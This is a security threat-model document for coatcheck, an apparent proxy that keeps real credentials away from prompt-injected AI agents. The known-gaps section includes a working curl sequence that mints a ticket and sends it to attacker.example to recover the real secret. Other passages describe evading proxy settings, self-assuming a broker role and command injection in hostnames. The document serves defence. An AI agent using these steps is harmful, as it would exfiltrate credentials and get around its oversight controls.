# Threat model

## What coatcheck is for

An AI agent with shell access, a browser, and network egress processes
untrusted content (web pages, email, documents, search results, tool output).
Any of that content can carry instructions the model follows. coatcheck
assumes this happens and aims to keep real credentials out of everything the
agent can read: its process memory, environment, filesystem, logs, and model
context.

The agent receives a **ticket** (`tok_` + 64 hex chars) instead of a secret.
coatcheck swaps the ticket for the real value on the wire, after TLS
termination, on traffic it intercepts.

## Attacker

A prompt-injected or otherwise compromised agent process that:

- runs arbitrary commands and code (shell, Node, Python, Playwright),
- shares a network namespace with coatcheck (sidecar deployment), so it can
  reach every loopback listener coatcheck exposes,
- can read and change its own environment (`HTTPS_PROXY`, `NO_PROXY`, CA trust),
- holds whatever cloud identity the agent workload runs as,
- can reach the internet unless egress is enforced below the agent.

Out of scope: compromise of the coatcheck process or its container image,
compromise of the secret store, the upstream API, or the remote browser vendor.

## Deployment pattern that makes a sidecar meaningful

A broker in the same network namespace only helps if the agent cannot simply
go around it to the secret store. Three properties are required.

1. **The agent's identity is explicitly denied the secret store.** Not merely
   "not granted": an explicit deny on the secret path, so a later broad grant
   does not silently re-open it.
2. **coatcheck holds a separate identity** that can read (and, for OAuth
   refresh, write) those secrets. The agent must not be able to obtain that
   identity.
3. **Egress is enforced below the agent** so traffic cannot bypass the broker
   (see Egress below).

### Worked example: AWS (ECS/Fargate)

As shipped, `src/secret-fetcher.ts` reads per-agent secrets from SSM Parameter
Store under a per-agent prefix and shared secrets from Secrets Manager, and
optionally assumes a role named by `PROXY_ROLE_ARN` via STS before doing so
(`src/secret-fetcher.ts:58-94`).

- Agent task role: explicit `Deny` on `ssm:GetParameter*` for
  `…/user-secrets/*` and no `secretsmanager:GetSecretValue` on shared secrets.
- Broker role (one per agent): `ssm:GetParameter`, `ssm:GetParametersByPath`,
  `ssm:PutParameter` on that agent's `…/user-secrets/*`, and
  `secretsmanager:GetSecretValue` on the specific shared secrets coatcheck is
  allowed to broker.
- Verification: from inside the agent container,
  `aws ssm get-parameter --with-decryption --name …/user-secrets/x` and
  `aws secretsmanager get-secret-value --secret-id <shared>` both return
  `AccessDenied`.

**Pitfall: containers in one ECS task share one task role.** If the broker
role's trust policy trusts the task role, and the task role is allowed
`sts:AssumeRole` on the broker role, then the agent container can call
`sts:AssumeRole` itself (its SDK/CLI picks up the same task credentials from
the container credentials endpoint) and read every secret directly. The
explicit deny on the task role does not help, because the assumed broker role
is a different principal. Property 2 is violated. Ways to close it:

- Run coatcheck as a **separate task/service** with its own task role, and
  have the agent reach it over the network (then authenticate the vault API;
  see gaps).
- Keep the sidecar, but add a trust-policy condition only the broker can
  satisfy, for example an `sts:ExternalId` whose value is injected into the
  **broker container only** via a container-level secret (fetched by the
  execution role, not the task role), so the agent container never sees it.
- Block the agent container from the credentials endpoint (`169.254.170.2`)
  with egress rules, if nothing in the agent needs cloud credentials.

Other platforms have the same shape: on Kubernetes, containers in a pod share
a service account, so a sidecar with a separate cloud identity needs either a
separate pod or a credential the agent container cannot read. On a VM, run the
broker as a different OS user with the credential readable only by that user.

## Egress: `HTTPS_PROXY` is advisory

Clients reach coatcheck because `HTTP_PROXY`/`HTTPS_PROXY` point at it. That is
a convention, not a control. A compromised agent can run `curl --noproxy '*'`,
unset the variables, or use a library that ignores them.

For secrets that only live in the broker, bypassing the proxy gains the
attacker nothing: the agent holds only tickets, and tickets resolve nowhere
else. Bypass matters for everything else the agent holds (files on disk,
tokens obtained elsewhere) and for exfiltrating data in general.

Recommendations, in order:

1. **Enforce egress below the agent.** Drop direct outbound TCP from the agent
   except to coatcheck. Examples: `iptables -A OUTPUT -o lo -j ACCEPT;
   iptables -A OUTPUT -p tcp --dport 443 -j DROP; iptables -A OUTPUT -p tcp
   --dport 80 -j DROP` set before the agent drops privileges (needs
   `NET_ADMIN` at setup), a Kubernetes `NetworkPolicy`, or a cloud security
   group that only allows the broker's egress. If the broker shares the
   agent's network namespace, rules keyed on the broker's UID (`-m owner`) are
   needed to let the broker out while blocking the agent.
2. **Domain allowlist in the broker.** Once all traffic must pass through
   coatcheck, refuse CONNECT/forward requests to hosts outside an allowlist.
   Not implemented.

Neither closes the high-severity gap below: coatcheck itself will substitute a
ticket into a request to any destination.

## Properties that hold today

| Property | Mechanism |
|---|---|
| Real values never enter the agent's env, files, or model context via the vault API | `/_vault/*` and `/_secret/*` return tickets, never values (except fields the secret explicitly lists in `_cleartext`) (`src/vault-handler.ts:100-135`) |
| A ticket alone is useless outside the broker | 32 random bytes; resolves only inside coatcheck's token store |
| Tickets expire | 900 s default (`src/token-store.ts:4`); session-bound tickets 600 s default, 1800 s max (`src/vault-handler.ts:222-223`) |
| `curl -v` on the agent side shows only the ticket | Substitution happens after TLS termination, on coatcheck's upstream leg |
| Session-bound (browser) tickets never resolve on HTTPS | `src/token-store.ts:133` |
| Shared secrets are allowlisted | `/_secret/{name}` refuses names outside a hard-coded allowlist (`src/vault-handler.ts:18-20`, `:150-154`) |
| Upstream TLS is verified | `tls.connect` with default `rejectUnauthorized` (`src/index.ts:173`) |
| Logs carry no values | Swap logs record secret names, host, and ticket age only (`src/index.ts:269-290`) |

## Known gaps

Severity reflects the attacker above. File references are to `src/`.

### HIGH: tickets are not bound to destination hosts

`TokenStore.replaceAll` substitutes every active unscoped ticket into any
request, whatever the destination (`token-store.ts:119-141`), on both the
plain-HTTP forward path (`index.ts:41-77`, `:228-255`) and the HTTPS MITM path
(`index.ts:152`, `:257-261`). So:

```bash
TOK=$(curl -s http://127.0.0.1:3128/_vault/some-api-key | jq -r .token)
curl -x http://127.0.0.1:3128 "http://attacker.example/?k=$TOK"
```

delivers the real value to `attacker.example`. The destination can also be a
listener the agent runs itself on loopback, so egress enforcement does not
help: the agent can recover the plaintext of every secret it can mint a ticket
for. Until host binding lands, coatcheck keeps secrets out of the agent's
context, logs, and disk, and stops passive leaks (an echoed env var, a pasted
log), but does **not** stop an agent that is actively trying to exfiltrate.
Fix: per-secret `allowed_hosts` checked against the CONNECT target (see
`docs/ROADMAP.md`).

### HIGH (mitigated): certificate generation shells out

CONNECT targets are parsed strictly before use (`src/connect-target.ts`): the
host must be an RFC 1123 DNS name or an IP literal and the port 1–65535;
anything else gets `400`. That closes the command-injection and path-traversal
route, where a hostname containing `$(…)`, backticks, `;`, `&`, `|`, `/` or
`..` reached `execSync` command strings and file paths in
`CertAuthority.getCertForHost` (`src/ca.ts`).

Certificates are still generated by shelling out to `openssl` with the
validated hostname interpolated into the command line, and per-host key files
are still written under `CA_DIR`. Validation is the only barrier. Fix:
in-process certificate generation (roadmap item 2).

### MEDIUM: tickets are reusable until TTL

Unscoped tickets are never revoked on use; any number of requests can carry
the same ticket for 15 minutes (`token-store.ts:4`, `:119-141`). Only
session-bound tickets are revoked early (on CDP disconnect). There is no
single-use option.

### MEDIUM: MITM engages only when the token store is non-empty

At CONNECT time, an empty store means a raw TCP tunnel (`index.ts:94-99`). A
tunnel opened before the first ticket was issued stays passthrough for its
whole life, so a client with a keep-alive connection pool can later send a
ticket down an un-MITM'd tunnel. It fails closed (the upstream sees `tok_…`
and rejects it), but it is surprising, and it also means traffic inspection
and any future allowlist would not apply to those tunnels.

### MEDIUM: vault endpoints are unauthenticated

`/_vault`, `/_vault/{name}`, `/_vault/mint-tokens`, `/_vault/{name}/refresh`,
and `/_secret/{name}` accept any caller (`vault-handler.ts:26-203`). Isolation
rests entirely on the listener binding to `127.0.0.1` (`index.ts:295`). Setting
`PROXY_BIND_HOST=0.0.0.0` (intended for local dev) lets anything that can
reach the port mint tickets and, combined with the host-binding gap, read every
secret. The CDP listener uses the same bind host and authenticates only by
sid.

### LOW: Host header not checked against the CONNECT target

Inside a MITM'd tunnel the request's `Host` header is forwarded untouched
while the upstream socket goes to the CONNECT hostname (`index.ts:173`). TLS
SNI from the client is not compared either. Harmless today, but any future
host-bound policy must key on the CONNECT target (the actual upstream), never
on `Host`.

### LOW: request bodies are not swapped

Only headers and URL are rewritten (`index.ts:148-157`, `:228-255`). Body
bytes pass through. This is a functional limitation (tickets in JSON or
form bodies do not work) and narrows the substitution surface, which is
mildly protective. Related: `Transfer-Encoding: chunked` request bodies are not
parsed (`index.ts:137-143`), so a chunked body can misalign the request parser
on a keep-alive tunnel. The MITM also assumes HTTP/1.1 request/response:
WebSocket upgrades or other protocols tunneled through a MITM'd CONNECT stall.

### LOW: OAuth refresh failure logs the provider's response body

`handleOAuthRefresh` logs `errorText` verbatim when the token endpoint returns
non-2xx (`vault-handler.ts:353-355`). Providers usually return a short error
JSON, but anything a provider echoes (client id, a fragment of the grant)
lands in coatcheck's logs. Log status and a truncated, parsed `error` field
instead.

### LOW: secret names are passed through to the store unvalidated

`/_vault/{name}` decodes the path segment and appends it to the store prefix
(`vault-handler.ts:62-64`, `secret-fetcher.ts:127-139`). With SSM the name is
literal and IAM bounds it, so `..` has no effect. A filesystem- or
path-based provider would need to reject `/` and `..`.

### Browser injection

See `docs/design/cdp-injection.md` for gaps specific to the CDP path: no
origin binding, `Runtime.evaluate` exfiltration, transform-blind redaction,
uninspected binary frames, `mint-tokens` not validating `sessionId`.

## Residual risk accepted by design

- **Authenticated-action abuse.** An agent can use a credential for its
  intended purpose maliciously (delete repos, send messages, place orders).
  A broker controls where secrets go, not what an authorized call does.
- **Upstream trust.** The upstream API and the remote browser vendor see real
  values.
- **Cleartext fields.** Fields listed in a secret's `_cleartext` are returned
  to the agent as plain values by design; only list non-sensitive data (URLs,
  account ids).
